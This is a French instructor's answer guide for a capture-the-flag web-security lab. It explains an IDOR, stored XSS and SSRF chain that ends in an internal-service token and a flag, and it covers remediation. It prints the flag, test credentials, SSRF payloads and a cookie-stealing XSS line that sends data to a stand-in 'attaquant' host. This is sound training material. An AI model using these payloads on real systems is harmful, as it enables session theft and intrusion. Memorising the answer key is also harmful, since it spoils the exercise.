# Guide Formateur (confidentiel) — Lumen Freight Lab

*Ne pas diffuser aux apprenants avant la fin de l'exercice.*

## 1. Vue d'ensemble de la chaîne d'exploitation

```
Inscription compte employé
        │
        ▼
IDOR sur /tickets/<id>  ──────────────►  Lecture tickets #1 et #2 (indices)
        │                                   │
        │                                   ├─ Ticket #1 (admin) : révèle
        │                                   │  l'hôte interne "vault:5001"
        │                                   │
        │                                   └─ Ticket #2 (bob->julie) : révèle
        │                                      la route de debug /raw
        ▼
Confirmation XSS stockée sur /tickets/<id>/raw
        │
        ▼
Création d'un ticket avec image markdown
pointant vers http://vault:5001/internal/status
        │  (SSRF : le backend helpdesk fait la requête)
        ▼
Récupération du token de service dans l'aperçu affiché
        │
        ▼
Nouveau ticket avec image markdown pointant vers
http://vault:5001/internal/export?file=flag.txt&token=<token>
        │  (SSRF réutilisé, maintenant authentifié)
        ▼
FLAG récupéré dans l'aperçu du ticket
```

**Flag final :** `LUMEN{ssrf_vers_service_interne_non_authentifie_8f2c91}`

## 2. Résolution détaillée étape par étape

### Étape 1 — Reconnaissance et compte

L'apprenant crée un compte via `/register` (ou utilise `j.leclerc` /
`Welcome123`). Le portail ne propose rien de sensible en apparence.

### Étape 2 — IDOR (CWE-639)

`/tickets/<id>` n'effectue **aucune vérification** que l'utilisateur
connecté est bien l'auteur du ticket consulté (voir `view_ticket()` dans
`helpdesk/app.py`). En testant simplement `/tickets/1` et `/tickets/2`,
l'apprenant lit :

- **Ticket #1** (admin.rousseau) : révèle que l'aperçu d'image passe par
  un service interne nommé `vault`, port `5001`, et insiste sur le fait
  qu'il ne doit jamais être exposé publiquement — breadcrumb direct vers
  l'étape SSRF.
- **Ticket #2** (bob.martin → julie) : révèle l'existence d'une route de
  debug `/tickets/<id>/raw`, censée avoir été retirée avant la mise en
  production — breadcrumb direct vers l'étape XSS.

*Point pédagogique :* une vulnérabilité "mineure" en apparence (IDOR en
lecture seule sur un ticketing interne) devient le point de départ de
toute la chaîne parce qu'elle expose des informations d'architecture.
C'est un schéma très courant en mission réelle.

### Étape 3 — XSS stockée (CWE-79)

En créant un ticket avec une description contenant par exemple :

```html
<script>document.title='pwned'</script>
```

L'apprenant observe que la vue normale (`/tickets/<id>`) échappe
correctement le contenu (auto-escaping Jinja2), mais que
`/tickets/<id>/raw` l'injecte tel quel dans le HTML renvoyé (voir
`view_ticket_raw()`, qui construit la réponse par concaténation de
chaînes au lieu d'utiliser le moteur de templates avec échappement).

*Point pédagogique :* la route es un vestige de QA jamais retiré — un
scénario extrêmement fréquent en entreprise (flag de debug, route de
test, compte de démo oublié). Dans ce lab elle sert surtout à démontrer
la détection/preuve d'une XSS stockée sans nécessiter un navigateur
automatisé ; en atelier, demander aux apprenants d'imaginer un payload
réaliste de vol de session (`<script>fetch('http://attaquant/?c='+document.cookie)</script>`)
et d'expliquer pourquoi, ici, le cookie de session serait exploitable si
un agent consultait cette route avec les payloads d'un attaquant.

### Étape 4 — SSRF (CWE-918)

La fonctionnalité "aperçu de pièce jointe" (`fetch_preview()` dans
`app.py`) effectue une requête HTTP **côté serveur** vers n'importe quelle
URL trouvée dans la description, sans aucune validation d'hôte, d'IP ou
de schéma. En soumettant :

```
![preview](http://vault:5001/internal/status)
```

le backend `helpdesk` (qui, lui, EST sur le réseau interne
`internal_net`) effectue la requête à la place de l'apprenant et affiche
un extrait de la réponse dans le ticket — y compris le jeton de service
`VLT-...-SERVICE-TOKEN`.

*Point pédagogique :* c'est un SSRF **non aveugle** (la réponse est
renvoyée à l'attaquant), ce qui le rend accessible à des débutants tout
en restant réaliste (de nombreux SSRF réels via proxys d'aperçu /
unfurling de liens fonctionnent exactement ainsi). Insister sur le fait
que la vulnérabilité racine est l'absence de *allow-list* d'hôtes/IP
autorisés pour les requêtes sortantes, combinée à l'absence de
segmentation stricte malgré le réseau Docker interne.

### Étape 5 — Confiance réseau interne et exfiltration (CWE-306)

`vault` (service `vault/app.py`) répond sans authentification forte :
seul un jeton statique protège `/internal/export`. Une fois le jeton
obtenu à l'étape précédente, un second ticket avec :

```
![export](http://vault:5001/internal/export?file=flag.txt&token=VLT-7f3a9c2e-SERVICE-TOKEN)
```

renvoie le flag dans l'aperçu.

*Point pédagogique :* même un service "interne donc sûr" doit être
authentifié correctement — le confinement réseau (que l'on a bien
appliqué ici, `vault` n'a pas de port exposé à l'hôte) réduit la surface
mais ne remplace pas l'authentification applicative. C'est précisément
le détournement en proxy via le SSRF du helpdesk qui contourne le
confinement réseau.

## 3. Extensions facultatives (apprenants rapides)

- Modifier `fetch_preview()` mentalement : comment un développeur
  corrigerait-il le SSRF (allow-list de domaines, blocage des plages
  d'IP privées `127.0.0.0/8`, `10.0.0.0/8`, `169.254.0.0/16`,
  résolution DNS puis vérification de l'IP avant la requête) ?
- Rédiger un patch réel pour `/tickets/<id>/raw` (le supprimer, ou lui
  appliquer un échappement Jinja2 standard).
- Proposer un modèle d'authentification pour `vault` qui résisterait même
  si le jeton fuitait (rotation, scoping par IP source, mTLS interne).
- Repérer et exploiter l'IDOR sur d'autres tickets pour cartographier
  l'historique complet du projet (exercice d'énumération).

## 4. Pièges volontaires / fausses pistes

- Le formulaire de login n'a aucune vulnérabilité d'injection SQL
  (requêtes paramétrées partout) — certains apprenants perdront du temps
  à tester des payloads SQLi, ce qui est pédagogiquement voulu : apprendre
  à abandonner une piste qui ne mène nulle part.
- Les mots de passe des comptes de test sont volontairement "faibles"
  mais ce n'est **pas** le chemin d'exploitation prévu (pas de
  bruteforce nécessaire ni utile ici).

## 5. Grille d'évaluation suggérée

| Critère | Points |
|---|---|
| IDOR identifié et exploité, 2 tickets lus | 15 |
| XSS stockée démontrée (payload + comparaison vue normale/raw) | 20 |
| SSRF identifié et jeton de service récupéré | 25 |
| Flag final récupéré via le jeton | 20 |
| Rapport : chaîne complète expliquée + impact métier | 15 |
| Recommandations de correction pertinentes | 5 |

## 6. Correctifs recommandés (à fournir après debrief)

Voir `VULNERABILITIES.md` pour le détail complet par vulnérabilité ; en
synthèse :

1. **IDOR** : vérifier systématiquement `ticket.author_id == current_user.id`
   (ou rôle agent/admin) avant de servir un ticket.
2. **XSS stockée** : supprimer la route `/raw` ; si un rendu "brut" est
   réellement nécessaire, utiliser le moteur de templates (auto-escaping
   actif) plutôt qu'une concaténation manuelle de chaînes.
3. **SSRF** : valider le schéma (https uniquement), résoudre le DNS puis
   vérifier que l'IP n'appartient pas à une plage privée/loopback/
   link-local avant d'effectuer la requête ; idéalement, faire passer ces
   requêtes par un proxy sortant dédié avec allow-list.
4. **Confiance réseau interne** : authentification forte sur `vault`
   (ex: mTLS inter-services, jeton à courte durée de vie, scoping réseau
   strict au niveau du service mesh), même si le réseau est "interne".
